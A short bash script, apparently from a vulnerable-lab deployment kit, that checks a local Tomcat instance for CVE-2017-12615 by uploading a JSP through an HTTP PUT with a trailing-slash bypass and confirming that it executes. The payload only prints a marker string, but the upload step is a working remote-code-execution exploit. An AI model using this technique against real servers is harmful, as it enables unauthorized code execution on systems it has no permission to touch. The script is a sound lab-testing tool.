#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/deploy-common.sh"

TARGET="Tomcat"
URL="http://localhost:8082"
CVE="CVE-2017-12615"

log_info "Verifying $TARGET ($CVE) at $URL..."

# Step 1: Upload test JSP
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "${URL}/test.jsp/" -d '<% out.println("VULN");%>' 2>/dev/null)
if [ "$HTTP_CODE" != "201" ] && [ "$HTTP_CODE" != "200" ] && [ "$HTTP_CODE" != "204" ]; then
    log_error "$TARGET PUT upload failed (HTTP $HTTP_CODE)"
    exit 1
fi

# Step 2: Request the uploaded JSP
BODY=$(curl -s --connect-timeout 5 --max-time 10 "${URL}/test.jsp" 2>/dev/null)

if echo "$BODY" | grep -q "VULN"; then
    log_success "$TARGET is vulnerable ($CVE) — RCE confirmed"
    echo "  Response: $(echo "$BODY" | tr -d '\n' | head -c 200)"
    exit 0
else
    log_error "$TARGET exploit failed — JSP not executed"
    exit 1
fi
